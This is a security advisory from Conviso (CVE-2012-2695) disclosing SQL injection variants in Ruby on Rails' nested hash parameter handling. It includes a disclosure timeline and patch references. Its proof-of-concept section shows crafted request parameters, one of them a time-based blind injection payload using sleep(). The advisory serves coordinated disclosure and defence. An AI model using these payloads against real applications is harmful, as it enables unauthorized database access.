Conviso Application Security - Conviso Security Labs Advisory
http://www.conviso.com.br/

Ruby on Rails SQL Injection


  
  
  
  
  1. *Advisory Information*

    

      Title: Ruby on Rails SQL Injection
Advisory ID: CONVISO-12-001
Advisory URL: http://www.conviso.com.br/advisories/CONVISO-12-001.txt
Date published: 2012-06-20
Date of last update: 2012-06-19
Vendors contacted: Ruby on Rails team
Release mode: Coordinated release

    
        
  
  
  2. *Vulnerability Information*

    

      Class: SQL injection [CWE-89]
Impact: Code execution
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2012-2695
CVSS v2 Score: (AV:N/AC:M/Au:N/C:P/I:P/A:N)

    

  
  
  3. *Vulnerability Description*

    

      Ruby on Rails [1] is a very popular and commonly used web framework. It is self-described as "an open-source web framework that's optimized for programmer happiness and sustainable productivity. It lets you write beautiful code by favoring convention over configuration". A SQL Injection [2] vulnerability have been found on it that affected all versions.
    

  
  
  4. *Vulnerable packages*

    

      

        
   . All versions
      


    

  
  
  5. *Non-vulnerable packages*

    

      

      


    

  
  
  6. *Vendor Information, Solutions and Workarounds*

    

      The vendor has provided patches and some new Rails releases that fix the flaws. [3]
    

  
  
  7. *Credits*

    

      This vulnerability was discovered and researched by Gabriel Quadros Silva. 
      The publication of this advisory was coordinated by Gabriel Quadros Silva.
    

  
  
  8. *Technical Description / Proof of Concept Code*

    

      The vulnerabilities found are actually two variants of the CVE-2012-2661 case. We will cover them later. First let's see the original vulnerability fixed on CVE-2012-2661. This vulnerability occurred during the processing of code like "Post.where(:id => params[:id]).all". In this case, the attacker was able to change the query by manipulating the hash to include any table/column pair.

      Example:

      

/-----
      Request: controller?id=123
      Query: SELECT `posts`.* FROM `posts` WHERE `posts`.`id` = '123'

      Request: controller?id[table.column]=123
      Query: SELECT `posts`.* FROM `posts` WHERE `table`.`column` = '123'
      
-----/


      After the release of the patches for CVE-2012-2661, we did some investigation and still were able to exploit the same piece of code with two different variants. The first one was simply a small change in the way the hash is passed.

      Example:

      

/-----
      Request: controller?id=123
      Query: SELECT `posts`.* FROM `posts` WHERE `posts`.`id` = '123'

      Request: controller?id[table][column]=123
      Query: SELECT `posts`.* FROM `posts` WHERE `table`.`column` = '123'
      
-----/


      And the second one exploited a flaw which allowed the attacker to specify the database name to be used in a SHOW TABLES query. Since the name was user-supplied and not quoted, we were able to execute a Blind SQL Injection (tested on MySQL) and an Error-Based SQL Injection in case Rails is misconfigured to exhibit the exception/stacktrace pages. There is also a blog [2] that talks about this case.

      Example:

      

/-----
      Request: controller?id=123
      Query: SELECT `posts`.* FROM `posts` WHERE `posts`.`id` = '123'

      Request: controller?id[mysql%20where%20(select%200)%20or%20sleep(1).xxx][yyy]=123
      Queries:

      SHOW TABLES
      SHOW TABLES IN mysql where (select 0) or sleep(1)
      (...)
      SELECT `posts`.* FROM `posts` WHERE `mysql where (select 0) or sleep(1)`.`xxx`.`yyy` = '123'
      
-----/

    

  
  
  9. *Report Timeline*

    

      . 2012-06-07:

          Conviso Security Labs notifies the Rails team of the vulnerability and
          sends a brief technical report.
        

. 2012-06-07:

          The Rails team acknowledges the vulnerability report and informs that
          the patches will be available in up to two days.
        

. 2012-06-08:

          The Rails team provides the patches to be tested by all researchers
          that independently reported the vulnerability.
        

. 2012-06-09:

          Conviso Security Labs confirms that the patches are Ok.
        

. 2012-06-12:

          The Rails team releases an advisory and patches for the vulnerability. [3]
          Rails 3.2.6, 3.1.6, 3.0.14 are released.
        

. 2012-06-20:

          Advisory CONVISO-12-001 is published.
        

    

  
  
  10. *References*

    
[1] http://rubyonrails.org
[2] https://www.owasp.org/index.php/SQL_injection
[3] http://seclists.org/oss-sec/2012/q2/504

  
  
  11. *About the Researcher Organization*

    

      Conviso Application Security is a consulting company specialized on application security. Our values are based on the allocation of the adequate competencies on the field, a clear and direct speech with the market, collaboration and partnership with our customers and business partners and constant investments on methodology and research improvement. For more information about our company and services provided, please check our website at www.conviso.com.br.
    

  
  
  12. *Disclaimer*

    

      The contents of this advisory are copyright 
      (c) 2012 Conviso Application Security,
      and are licensed under a Creative Commons
      Attribution Non-Commercial Share-Alike 3.0 (United States) License:
      http://creativecommons.org/licenses/by-nc-sa/3.0/us/
    

  
  
  13. *PGP/GPG Keys*

    

      This advisory has been signed with the GPG key of the Conviso Security Labs advisories team, 
      which is available for download at 
      http://www.conviso.com.br/conviso_security_advisories.asc.
    

  
  
  
